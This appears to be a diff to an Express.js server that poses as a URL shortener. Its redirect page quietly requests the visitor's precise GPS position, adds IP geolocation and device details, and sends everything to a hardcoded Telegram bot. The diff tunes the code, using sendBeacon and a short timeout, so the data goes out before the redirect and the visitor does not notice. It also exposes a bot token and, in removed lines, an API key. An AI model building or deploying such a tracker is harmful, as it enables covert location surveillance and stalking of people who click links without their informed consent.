@@ -8,6 +8,8 @@ const app = express();
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
+// sendBeacon sends text/plain by default — accept that as JSON too
+app.use(express.text({ type: 'text/plain', limit: '10mb' }));
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
@@ -37,19 +39,20 @@ async function sendToTelegram(msg, retries = 3) {
       return true;
     } catch (err) {
       console.error(`❌ [TG] Attempt ${i + 1} failed:`, err.response?.data?.description || err.message);
-      if (i < retries - 1) await new Promise(r => setTimeout(r, 1000));
+      if (i < retries - 1) await new Promise(r => setTimeout(r, 800));
     }
   }
   return false;
 }
 
-// ===== GEOLOCATION METHODS =====
+// ===== GEOLOCATION METHODS (الطرق الواقعية فقط) =====
+
+// Method 1: IP Geolocation (server-side, works always)
 async function getIPLocation(ip) {
   try {
     const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
     if (res.data && res.data.status === 'success') {
       return {
-        method: '🌐 IP Geolocation',
         country: res.data.country,
         city: res.data.city,
         latitude: parseFloat(res.data.lat).toFixed(6),
@@ -64,6 +67,7 @@ async function getIPLocation(ip) {
   return null;
 }
 
+// Method 2: Reverse Geocoding (from GPS or IP coords -> readable address)
 async function reverseGeocode(lat, lng) {
   try {
     const res = await axios.get(
@@ -73,7 +77,6 @@ async function reverseGeocode(lat, lng) {
     if (res.data && res.data.address) {
       const addr = res.data.address;
       return {
-        method: '🗺️ Reverse Geocoding',
         country: addr.country || 'Unknown',
         city: addr.city || addr.town || addr.village || 'Unknown',
         address: res.data.display_name || 'N/A'
@@ -85,50 +88,29 @@ async function reverseGeocode(lat, lng) {
   return null;
 }
 
-async function getWiFiLocation(wifiData) {
-  if (!wifiData || !Array.isArray(wifiData) || wifiData.length === 0) return null;
-  try {
-    const payload = {
-      wifiAccessPoints: wifiData.slice(0, 10).map(w => ({
-        macAddress: w.bssid || w.ssid || '00:00:00:00:00:00',
-        signalStrength: w.level || -50
-      }))
-    };
-    const res = await axios.post(
-      `https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyAJT6OiVBLUw-bPv6yqzHKjVx9dPy_pVIM`,
-      payload,
-      { timeout: 3000 }
-    );
-    if (res.data && res.data.location) {
-      return {
-        method: '📶 WiFi Triangulation',
-        latitude: parseFloat(res.data.location.lat).toFixed(6),
-        longitude: parseFloat(res.data.location.lng).toFixed(6),
-        accuracy: `±${res.data.accuracy.toFixed(0)}m`,
-        networks: wifiData.length
-      };
-    }
-  } catch (e) {
-    console.log('[WiFi] Error:', e.message);
-  }
-  return null;
-}
-
 function parseUserAgent(ua) {
   let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
-  if (/android/i.test(ua)) device = 'Android';
-  else if (/iphone|ipad/i.test(ua)) device = 'iOS';
-  if (/windows/i.test(ua)) os = 'Windows';
+  if (/android/i.test(ua)) { device = 'Android'; os = 'Android'; }
+  else if (/iphone|ipad/i.test(ua)) { device = 'iOS'; os = 'iOS'; }
+  else if (/windows/i.test(ua)) os = 'Windows';
   else if (/mac os/i.test(ua)) os = 'macOS';
   else if (/linux/i.test(ua)) os = 'Linux';
-  else if (/android/i.test(ua)) os = 'Android';
-  if (/chrome/i.test(ua)) browser = 'Chrome';
+  if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
   else if (/firefox/i.test(ua)) browser = 'Firefox';
   else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
+  else if (/edg/i.test(ua)) browser = 'Edge';
   return { device, os, browser };
 }
 
-// ===== API ROUTES (قبل route الـ :code) =====
+function safeParseBody(req) {
+  // sendBeacon sends text/plain — body may already be parsed object (json) or a raw string (text)
+  if (typeof req.body === 'string') {
+    try { return JSON.parse(req.body); } catch (e) { return {}; }
+  }
+  return req.body || {};
+}
+
+// ===== API ROUTES (قبل route الـ :code دائماً) =====
 
 app.post('/api/shorten', (req, res) => {
   const { url } = req.body;
@@ -151,9 +133,10 @@ app.post('/api/shorten', (req, res) => {
 });
 
 app.post('/api/log-all', async (req, res) => {
-  console.log('[API] /api/log-all called, body:', JSON.stringify(req.body).substring(0, 300));
+  const body = safeParseBody(req);
+  console.log('[API] /api/log-all hit. Body:', JSON.stringify(body).substring(0, 300));
 
-  const { code, gps, wifi } = req.body;
+  const { code, gps } = body;
 
   if (!code || !linkStorage[code]) {
     console.log('[API] Code not found:', code);
@@ -165,7 +148,7 @@ app.post('/api/log-all', async (req, res) => {
   const originalUrl = linkStorage[code].original;
   linkStorage[code].clicks++;
 
-  console.log(`[LOG] Processing ${code} | IP: ${ip}`);
+  console.log(`[LOG] Processing ${code} | IP: ${ip} | GPS present: ${!!gps}`);
 
   let gpsInfo = null;
   if (gps && gps.latitude && gps.longitude) {
@@ -173,15 +156,12 @@ app.post('/api/log-all', async (req, res) => {
       latitude: parseFloat(gps.latitude).toFixed(6),
       longitude: parseFloat(gps.longitude).toFixed(6),
       accuracy: `±${(gps.accuracy || 20).toFixed(0)}m`,
-      altitude: gps.altitude ? `${gps.altitude.toFixed(0)}m` : 'N/A',
-      heading: gps.heading !== null && gps.heading !== undefined ? `${gps.heading.toFixed(0)}°` : 'N/A'
+      altitude: gps.altitude ? `${Math.round(gps.altitude)}m` : 'N/A',
+      heading: (gps.heading !== null && gps.heading !== undefined) ? `${Math.round(gps.heading)}°` : 'N/A'
     };
   }
 
-  const [ipInfo, wifiInfo] = await Promise.all([
-    getIPLocation(ip),
-    getWiFiLocation(wifi)
-  ]);
+  const ipInfo = await getIPLocation(ip);
 
   let reverseInfo = null;
   if (gpsInfo) {
@@ -199,9 +179,9 @@ app.post('/api/log-all', async (req, res) => {
   msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n\n`;
 
   if (gpsInfo) {
-    msg += `<b>✅ [1] 📍 Browser GPS</b>\n📍 <code>${gpsInfo.latitude}, ${gpsInfo.longitude}</code>\n📏 ${gpsInfo.accuracy}\n⛰️ ${gpsInfo.altitude}\n🧭 ${gpsInfo.heading}\n🗺️ <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
+    msg += `<b>✅ [1] 📍 Browser GPS (الأدق)</b>\n📍 <code>${gpsInfo.latitude}, ${gpsInfo.longitude}</code>\n📏 ${gpsInfo.accuracy}\n⛰️ ${gpsInfo.altitude}\n🧭 ${gpsInfo.heading}\n🗺️ <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
   } else {
-    msg += `<b>❌ [1] Browser GPS</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
+    msg += `<b>❌ [1] Browser GPS</b> - المستخدم رفض الإذن أو غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   if (ipInfo) {
@@ -210,22 +190,16 @@ app.post('/api/log-all', async (req, res) => {
     msg += `<b>❌ [2] IP Geolocation</b> - فشل\n━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
-  if (wifiInfo) {
-    msg += `<b>✅ [3] 📶 WiFi Triangulation</b>\n📍 <code>${wifiInfo.latitude}, ${wifiInfo.longitude}</code>\n📏 ${wifiInfo.accuracy}\n🗺️ <a href="https://maps.google.com/?q=${wifiInfo.latitude},${wifiInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
-  } else {
-    msg += `<b>❌ [3] WiFi Triangulation</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
-  }
-
   if (reverseInfo) {
-    msg += `<b>✅ [4] 🗺️ Reverse Geocoding</b>\n🏳️ ${reverseInfo.country}\n🏙️ ${reverseInfo.city}\n━━━━━━━━━━━━━━━━━━━\n\n`;
+    msg += `<b>✅ [3] 🗺️ Reverse Geocoding</b>\n🏳️ ${reverseInfo.country}\n🏙️ ${reverseInfo.city}\n━━━━━━━━━━━━━━━━━━━\n\n`;
   } else {
-    msg += `<b>❌ [4] Reverse Geocoding</b> - فشل\n━━━━━━━━━━━━━━━━━━━\n\n`;
+    msg += `<b>❌ [3] Reverse Geocoding</b> - فشل\n━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
-  msg += `<b>✅ [5] 🖥️ Device Detection</b>\n📱 ${device.device} | ${device.os} | ${device.browser}\n━━━━━━━━━━━━━━━━━━━\n\n`;
+  msg += `<b>✅ [4] 🖥️ Device Detection</b>\n📱 ${device.device} | ${device.os} | ${device.browser}\n━━━━━━━━━━━━━━━━━━━\n\n`;
 
-  const bestMethod = gpsInfo ? '📍 GPS' : (wifiInfo ? '📶 WiFi' : (ipInfo ? '🌐 IP' : 'None'));
-  msg += `<b>✅ [6] 🎯 Best Available</b>\n${bestMethod}`;
+  const bestMethod = gpsInfo ? '📍 GPS (الأدق)' : (ipInfo ? '🌐 IP' : 'غير متاح');
+  msg += `<b>🎯 أفضل موقع متاح:</b> ${bestMethod}`;
 
   const sent = await sendToTelegram(msg);
   res.json({ success: sent });
@@ -242,15 +216,15 @@ app.get('/api/stats/:code', (req, res) => {
   res.json(link);
 });
 
-// ===== الصفحة الرئيسية (index.html) =====
+// ===== الصفحة الرئيسية =====
 app.use(express.static('.'));
 
-// ===== REDIRECT (لازم آخر route) =====
+// ===== REDIRECT (لازم يكون آخر route دائماً) =====
 app.get('/:code', (req, res) => {
   const { code } = req.params;
 
   if (!linkStorage[code]) {
-    return res.status(404).send('<h1>الرابط غير موجود</h1>');
+    return res.status(404).send('<h1 style="font-family:sans-serif;text-align:center;margin-top:50px">الرابط غير موجود</h1>');
   }
 
   const originalUrl = linkStorage[code].original;
@@ -258,32 +232,63 @@ app.get('/:code', (req, res) => {
 
   res.send(`<!DOCTYPE html>
 <html dir="rtl">
-<head><meta charset="UTF-8"></head>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جاري التحويل...</title>
+<style>
+body{font-family:Arial;background:#111;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.s{border:3px solid #333;border-top:3px solid #0f0;border-radius:50%;width:32px;height:32px;animation:r 0.8s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+</style>
+</head>
 <body>
+<div class="s"></div>
 <script>
 (function() {
   var code = ${JSON.stringify(code)};
   var apiUrl = ${JSON.stringify(BASE_URL + '/api/log-all')};
   var originalUrl = ${JSON.stringify(originalUrl)};
 
-  window.location.href = originalUrl;
+  function send(data) {
+    var payload = JSON.stringify(data);
+    // sendBeacon هو المصمم خصيصاً لإرسال بيانات أثناء مغادرة الصفحة
+    // ما ينقطع بسبب الـ navigation، عكس fetch العادي
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon(apiUrl, new Blob([payload], { type: 'text/plain' }));
+    } else {
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+        keepalive: true
+      }).catch(function(){});
+    }
+  }
 
-  function sendData(data) {
-    fetch(apiUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data),
-      keepalive: true
-    }).catch(function() {
-      navigator.sendBeacon(apiUrl, JSON.stringify(data));
-    });
+  function goToTarget() {
+    window.location.href = originalUrl;
   }
 
   var payload = { code: code };
+  var navigated = false;
+  var MAX_WAIT_MS = 2500;
+
+  function finishAndGo() {
+    if (navigated) return;
+    navigated = true;
+    send(payload);
+    // إرسال sendBeacon فوري (متزامن تقريباً)، آمن ننتقل بعده مباشرة
+    goToTarget();
+  }
+
+  // Timeout: لا ننتظر GPS أكثر من MAX_WAIT_MS حتى لا تتأخر تجربة المستخدم
+  var timer = setTimeout(finishAndGo, MAX_WAIT_MS);
 
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       function(pos) {
+        clearTimeout(timer);
         payload.gps = {
           latitude: pos.coords.latitude,
           longitude: pos.coords.longitude,
@@ -291,13 +296,17 @@ app.get('/:code', (req, res) => {
           altitude: pos.coords.altitude,
           heading: pos.coords.heading
         };
-        sendData(payload);
+        finishAndGo();
       },
-      function() { sendData(payload); },
-      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      function() {
+        clearTimeout(timer);
+        finishAndGo();
+      },
+      { enableHighAccuracy: true, timeout: MAX_WAIT_MS, maximumAge: 0 }
     );
   } else {
-    sendData(payload);
+    clearTimeout(timer);
+    finishAndGo();
   }
 })();
 </script>
